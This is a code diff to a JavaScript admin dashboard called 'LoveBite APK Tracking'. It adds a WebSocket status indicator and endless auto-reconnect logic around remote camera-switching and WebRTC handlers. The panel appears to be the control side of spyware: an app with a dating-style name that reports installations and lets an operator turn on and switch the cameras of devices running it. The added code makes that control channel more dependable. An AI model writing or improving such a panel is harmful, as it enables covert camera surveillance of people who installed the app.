@@ -603,6 +603,10 @@
         <div class="header" style="position: relative;">
             <h1>💕 LoveBite APK Tracking</h1>
             <p>Global Installation Monitor Dashboard</p>
+            <div id="wsStatus" style="position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.2); color: white; border: 2px solid rgba(255,255,255,0.5); padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; display: flex; align-items: center; gap: 8px;">
+                <span style="width: 10px; height: 10px; border-radius: 50%; background: #f44336; display: inline-block; animation: pulse 2s infinite;"></span>
+                <span>Connecting...</span>
+            </div>
             <button onclick="logout()" style="position: absolute; top: 20px; right: 20px; background: rgba(255,255,255,0.2); color: white; border: 2px solid rgba(255,255,255,0.5); padding: 10px 20px; border-radius: 25px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s;" onmouseover="this.style.background='rgba(255,255,255,0.3)'" onmouseout="this.style.background='rgba(255,255,255,0.2)'">
                 🚪 Logout
             </button>
@@ -936,21 +940,50 @@
         // Initialize WebSocket connection
         function initializeWebSocket() {
             try {
+                console.log('🔌 Initializing WebSocket connection to:', WS_BASE);
+                
                 socket = io(WS_BASE, {
                     transports: ['websocket', 'polling'],
-                    timeout: 10000,
+                    timeout: 20000, // Increased timeout for Render
                     reconnection: true,
-                    reconnectionAttempts: 5,
-                    reconnectionDelay: 3000,
+                    reconnectionAttempts: Infinity, // Keep trying
+                    reconnectionDelay: 2000,
+                    reconnectionDelayMax: 10000,
+                    forceNew: false,
+                    upgrade: true,
+                    rememberUpgrade: true
                 });
 
                 socket.on('connect', () => {
                     console.log('✅ WebSocket connected to admin dashboard');
+                    updateWebSocketStatus(true);
                     socket.emit('join_admin_room');
+                });
+
+                socket.on('connect_error', (error) => {
+                    console.error('❌ WebSocket connection error:', error);
+                    updateWebSocketStatus(false);
+                });
+
+                socket.on('reconnect', (attemptNumber) => {
+                    console.log(`🔄 WebSocket reconnected after ${attemptNumber} attempts`);
+                    updateWebSocketStatus(true);
+                    socket.emit('join_admin_room');
+                });
+
+                socket.on('reconnect_attempt', (attemptNumber) => {
+                    console.log(`🔄 WebSocket reconnection attempt ${attemptNumber}...`);
+                    updateWebSocketStatus(false);
+                });
+
+                socket.on('reconnect_failed', () => {
+                    console.error('❌ WebSocket reconnection failed');
+                    updateWebSocketStatus(false);
                 });
 
                 socket.on('joined_admin_room', (data) => {
                     console.log('📊 Joined admin room:', data.message);
+                    updateWebSocketStatus(true);
                 });
 
                 socket.on('camera_started', (data) => {
@@ -1032,12 +1065,51 @@ socket.on('ice_candidate', (data) => {
 
                 // ICE candidate handling is already done above - removing duplicate handler
 
-                socket.on('disconnect', () => {
-                    console.log('🔌 WebSocket disconnected');
+                socket.on('disconnect', (reason) => {
+                    console.log('🔌 WebSocket disconnected. Reason:', reason);
+                    updateWebSocketStatus(false);
+                    
+                    if (reason === 'io server disconnect') {
+                        // Server disconnected, need to reconnect manually
+                        console.log('🔄 Server disconnected, attempting to reconnect...');
+                        socket.connect();
+                    }
                 });
 
             } catch (error) {
                 console.error('❌ WebSocket connection failed:', error);
+                updateWebSocketStatus(false);
+            }
+        }
+
+        // Update WebSocket connection status in UI
+        function updateWebSocketStatus(connected) {
+            const statusElement = document.getElementById('wsStatus');
+            if (statusElement) {
+                if (connected) {
+                    statusElement.innerHTML = `
+                        <span style="width: 10px; height: 10px; border-radius: 50%; background: #4CAF50; display: inline-block; animation: pulse 2s infinite;"></span>
+                        <span>🟢 Connected</span>
+                    `;
+                    statusElement.style.display = 'flex';
+                    statusElement.style.alignItems = 'center';
+                    statusElement.style.gap = '8px';
+                } else {
+                    statusElement.innerHTML = `
+                        <span style="width: 10px; height: 10px; border-radius: 50%; background: #f44336; display: inline-block; animation: pulse 2s infinite;"></span>
+                        <span>🔴 Disconnected</span>
+                    `;
+                    statusElement.style.display = 'flex';
+                    statusElement.style.alignItems = 'center';
+                    statusElement.style.gap = '8px';
+                }
+            }
+            
+            // Also update in console
+            if (connected) {
+                console.log('✅ WebSocket status: CONNECTED');
+            } else {
+                console.warn('⚠️ WebSocket status: DISCONNECTED');
             }
         }
         
@@ -1147,7 +1219,25 @@ socket.on('ice_candidate', (data) => {
                 }
 
                 if (!socket || !socket.connected) {
-                    alert('WebSocket not connected. Please refresh the page.');
+                    console.warn('⚠️ WebSocket not connected, attempting to reconnect...');
+                    updateWebSocketStatus(false);
+                    
+                    // Try to reconnect
+                    if (socket) {
+                        socket.connect();
+                    } else {
+                        initializeWebSocket();
+                    }
+                    
+                    // Wait a bit and check again
+                    setTimeout(() => {
+                        if (!socket || !socket.connected) {
+                            alert('WebSocket connection failed. Please check your connection and refresh the page.\n\nIf the issue persists, the server might be sleeping (Render free tier).');
+                            return;
+                        }
+                        // Retry the operation
+                        switchCamera(cameraType);
+                    }, 2000);
                     return;
                 }
 
